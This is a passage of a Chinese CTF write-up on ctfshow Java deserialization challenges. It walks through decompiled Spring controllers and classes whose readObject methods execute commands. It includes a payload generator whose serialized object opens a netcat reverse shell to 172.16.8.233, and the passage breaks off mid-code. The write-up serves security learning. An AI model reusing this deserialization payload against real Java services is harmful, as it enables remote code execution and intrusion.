class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- åº”ç”¨ç¨‹åºæ˜¾ç¤ºåç§° --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- ä¸Šä¸‹æ–‡å‚æ•°é…ç½® --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- ç›‘å¬å™¨é…ç½® --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- è¿‡æ»¤å™¨é…ç½® --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>charset<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>utf-8<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- è¿‡æ»¤å™¨æ˜ å°„ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>charset<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Servlet é…ç½® --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>/WEB-INF/dispatcher-servlet.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Servlet æ˜ å°„ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>dispatcher-servlet.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:mvc</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:annotation-driven</span>/&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/layui/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/WEB-INF/static/layui/&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/images/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/WEB-INF/static/images/&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/css/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/WEB-INF/static/css/&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:default-servlet-handler</span> /&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultViewResolver&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewClass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.JstlView&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/WEB-INF/views/&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;.jsp&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exposeContextBeansAsAttributes&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- IndexController--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.ctfshow.controller&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åŒ…è·¯å¾„<code>com.ctfshow.controller</code>ï¼Œæ§åˆ¶å™¨æ–‡ä»¶å<code>IndexController</code>ï¼Œä¸‹è¿™ä¸ª<code>IndexController.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctfshow.controller;<br><br><span class="hljs-keyword">import</span> com.ctfshow.entity.User;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.GET&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] userData = Base64.getDecoder().decode(request.getParameter(<span class="hljs-string">&quot;userData&quot;</span>));<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">safeObjectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(userData));<br>            user = (User)safeObjectInputStream.readUnshared();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var5) &#123;<br>            var5.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User class can not unserialize&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            var6.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unserialize error&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unserialize done, you username is &quot;</span> + user.getUsername();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å­˜åœ¨ååºåˆ—åŒ–å…¥å£ï¼Œå†å»ä¸‹è¿™ä¸ª<code>User</code>ç±»ï¼š<code>com.ctfshow.entity.User</code>åŒ…ä¸­çš„<code>user.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctfshow.entity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> String address;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == o) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (o != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.getClass() == o.getClass()) &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)o;<br>            <span class="hljs-keyword">return</span> Objects.equals(<span class="hljs-built_in">this</span>.username, user.username) &amp;&amp; Objects.equals(<span class="hljs-built_in">this</span>.password, user.password);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Objects.hash(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-built_in">this</span>.id, <span class="hljs-built_in">this</span>.username, <span class="hljs-built_in">this</span>.password&#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.email;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setEmail</span><span class="hljs-params">(String email)</span> &#123;<br>        <span class="hljs-built_in">this</span>.email = email;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNull</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != <span class="hljs-built_in">this</span>.username &amp;&amp; !<span class="hljs-built_in">this</span>.username.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> == <span class="hljs-built_in">this</span>.password || <span class="hljs-built_in">this</span>.password.isEmpty();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        input.defaultReadObject();<br>        Class.forName(<span class="hljs-built_in">this</span>.username).getMethod(<span class="hljs-built_in">this</span>.email, String.class).invoke(Class.forName(<span class="hljs-built_in">this</span>.username).getMethod(<span class="hljs-built_in">this</span>.password).invoke(Class.forName(<span class="hljs-built_in">this</span>.username)), <span class="hljs-built_in">this</span>.address);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‡å†™çš„<code>readObject</code>å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setUsername(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        user.setPassword(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        user.setEmail(<span class="hljs-string">&quot;exec&quot;</span>);<br>        user.setAddress(<span class="hljs-string">&quot;nc 172.16.8.233 3333 -e /bin/sh&quot;</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        os.writeObject(user);<br>        os.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));<br>        System.out.println(payload);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="843"><a href="#843" class="headerlink" title="843"></a>843</h2><p>ä¸‹è½½æºç ï¼Œ<code>pom.xml</code>å’Œ<code>properties</code>æ²¡å•¥å¥½ä¸œè¥¿ï¼Œ<code>config.class</code>å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> String execute;<br>    <span class="hljs-keyword">private</span> String[] args;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Config</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPath</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.path;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPath</span><span class="hljs-params">(String path)</span> &#123;<br>        <span class="hljs-built_in">this</span>.path = path;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getExecute</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.execute;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setExecute</span><span class="hljs-params">(String execute)</span> &#123;<br>        <span class="hljs-built_in">this</span>.execute = execute;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String[] getArgs() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.args;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setArgs</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-built_in">this</span>.args = args;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        input.defaultReadObject();<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-built_in">this</span>.args)).start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>CookieFilter.class</code>å­˜åœ¨ååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 